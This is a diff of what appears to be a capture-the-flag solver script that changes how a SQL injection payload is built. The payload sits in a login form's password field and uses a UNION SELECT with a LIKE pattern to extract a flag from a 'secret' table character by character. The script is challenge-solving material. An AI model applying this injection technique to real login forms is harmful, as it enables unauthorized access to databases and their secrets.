@@ -79,7 +79,7 @@ URL = f"http://{HOST}:{PORT}/login"
 def try_login(flag_part:str):
     data = {
         "username": "alpaca",
-        "password": f"' union select 1, flag from secret where flag like 'Alpaca{{{flag_part}%}}"
+        "password": "' union select 1, flag from secret where flag like 'Alpaca{" + flag_part+ "%}"
     }
     res = post(URL, data=data)
     return "Hello, user!" in res.text
